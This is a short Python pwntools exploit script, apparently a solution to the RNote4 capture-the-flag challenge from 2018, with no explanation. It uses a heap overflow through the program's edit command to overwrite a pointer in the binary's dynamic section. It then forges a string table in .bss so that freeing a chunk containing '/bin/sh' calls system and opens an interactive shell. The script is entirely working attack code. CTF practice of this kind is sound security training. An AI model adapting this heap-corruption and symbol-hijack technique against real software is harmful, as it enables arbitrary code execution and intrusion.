#!/usr/bin/env python
from pwn import *

def alloc(content):
    s.send('\x01')
    s.send(p64(len(content))[0])
    s.send(content)

def edit(index, content):
    s.send('\x02')
    s.send(p64(index)[0])
    s.send(p64(len(content))[0])
    s.send(content)

def delete(index):
    s.send('\x03')
    s.send(p64(index)[0])

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./RNote4')
    else:
        s = remote('rnote4.2018.teamrois.cn', 6767)

    elf = ELF('./RNote4')

    alloc('A' * 0x18)
    alloc('A' * 0x18)
    edit(0, 'A' * 0x18 + p64(0x21) + p64(0x18) + p64(0x601eb0))
    edit(1, p64(elf.bss(0x100)))
    edit(0, 'A' * 0x18 + p64(0x21) + p64(0x18) + p64(elf.bss(0x100)))
    edit(1, '/bin/sh\0'.ljust(0x5f,'A') + 'system\0')
    delete(1)

    s.interactive()
